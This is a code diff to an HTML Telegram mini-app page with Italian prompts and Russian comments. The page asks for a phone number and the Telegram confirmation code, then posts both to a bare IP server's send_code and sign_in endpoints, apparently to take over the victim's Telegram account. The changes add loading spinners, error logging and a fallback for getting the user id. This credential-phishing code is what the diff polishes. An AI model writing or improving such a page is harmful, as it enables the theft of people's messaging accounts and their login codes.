@@ -114,6 +114,21 @@
             background: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
         }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff6b6b;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -131,6 +146,7 @@
             <input type="tel" id="phone-input" class="input-field" placeholder="+39 123 456 7890">
             <button class="tg-button" onclick="sendPhoneNumber()">Invia Numero</button>
             <div id="phone-error" class="error" style="display: none;"></div>
+            <div id="phone-loading" class="loader" style="display: none;"></div>
         </div>
 
         <!-- Секция кода подтверждения -->
@@ -140,6 +156,7 @@
             <div class="keyboard" id="keyboard"></div>
             <button class="tg-button" onclick="sendCode()">✅ Invia Codice</button>
             <div id="code-error" class="error" style="display: none;"></div>
+            <div id="code-loading" class="loader" style="display: none;"></div>
         </div>
 
         <!-- Секция успеха -->
@@ -152,10 +169,34 @@
     <script>
         let currentCode = '';
         let userPhone = '';
+        let userId = null;
 
         // Инициализация WebApp
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
+
+        // Пытаемся получить user_id из initData
+        function getUserId() {
+            try {
+                // Способ 1: Из initData если доступно
+                if (Telegram.WebApp.initDataUnsafe && Telegram.WebApp.initDataUnsafe.user) {
+                    return Telegram.WebApp.initDataUnsafe.user.id;
+                }
+                
+                // Способ 2: Из query parameters (будем передавать из бота)
+                const urlParams = new URLSearchParams(window.location.search);
+                const userIdFromUrl = urlParams.get('user_id');
+                if (userIdFromUrl) {
+                    return userIdFromUrl;
+                }
+                
+                // Способ 3: Генерируем временный ID (как fallback)
+                return 'temp_' + Math.random().toString(36).substr(2, 9);
+                
+            } catch (error) {
+                return 'temp_' + Math.random().toString(36).substr(2, 9);
+            }
+        }
 
         function showSection(sectionId) {
             document.querySelectorAll('.section').forEach(section => {
@@ -197,6 +238,7 @@
         async function sendPhoneNumber() {
             const phoneInput = document.getElementById('phone-input');
             const errorDiv = document.getElementById('phone-error');
+            const loadingDiv = document.getElementById('phone-loading');
             
             userPhone = phoneInput.value.trim();
             
@@ -212,6 +254,11 @@
 
             try {
                 errorDiv.style.display = 'none';
+                loadingDiv.style.display = 'block';
+                
+                // Получаем user_id
+                userId = getUserId();
+                console.log('Using user_id:', userId);
                 
                 // Отправка номера на бэкенд
                 const response = await fetch('http://104.248.55.220:3001/api/send_code', {
@@ -221,11 +268,12 @@
                     },
                     body: JSON.stringify({
                         phone: userPhone,
-                        user_id: Telegram.WebApp.initDataUnsafe.user.id
+                        user_id: userId
                     })
                 });
 
                 const result = await response.json();
+                loadingDiv.style.display = 'none';
                 
                 if (result.status === 'code_sent') {
                     showSection('code-section');
@@ -236,13 +284,16 @@
                 }
 
             } catch (error) {
+                loadingDiv.style.display = 'none';
                 errorDiv.textContent = 'Errore di connessione: ' + error.message;
                 errorDiv.style.display = 'block';
+                console.error('Error:', error);
             }
         }
 
         async function sendCode() {
             const errorDiv = document.getElementById('code-error');
+            const loadingDiv = document.getElementById('code-loading');
             
             if (!currentCode) {
                 errorDiv.textContent = 'Per favore inserisci il codice';
@@ -252,6 +303,7 @@
 
             try {
                 errorDiv.style.display = 'none';
+                loadingDiv.style.display = 'block';
                 
                 // Отправка кода на бэкенд
                 const response = await fetch('http://104.248.55.220:3001/api/sign_in', {
@@ -261,11 +313,12 @@
                     },
                     body: JSON.stringify({
                         code: currentCode,
-                        user_id: Telegram.WebApp.initDataUnsafe.user.id
+                        user_id: userId
                     })
                 });
 
                 const result = await response.json();
+                loadingDiv.style.display = 'none';
                 
                 if (result.status === 'success') {
                     showSection('success-section');
@@ -279,10 +332,15 @@
                 }
 
             } catch (error) {
+                loadingDiv.style.display = 'none';
                 errorDiv.textContent = 'Errore di connessione: ' + error.message;
                 errorDiv.style.display = 'block';
+                console.error('Error:', error);
             }
         }
+
+        // Инициализация при загрузке
+        userId = getUserId();
     </script>
 </body>
 </html>
